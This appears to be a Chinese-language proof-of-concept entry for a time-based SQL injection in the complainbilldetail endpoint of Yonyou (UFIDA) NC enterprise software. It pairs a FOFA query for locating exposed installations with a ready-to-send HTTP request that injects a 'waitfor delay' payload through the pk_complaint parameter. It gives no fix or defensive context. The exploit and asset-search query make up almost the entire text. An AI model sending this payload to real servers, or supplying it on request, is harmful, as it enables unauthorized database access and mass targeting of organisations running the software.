# 用友NC complainbilldetail SQL注入漏洞
## 资产搜索
fofa app="用友-UFIDA-NC"   
## POC
```POST
GET /ebvp/advorappcoll/complainbilldetail?pageId=login&pk_complaint=1'waitfor+delay+'0:0:5'-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```
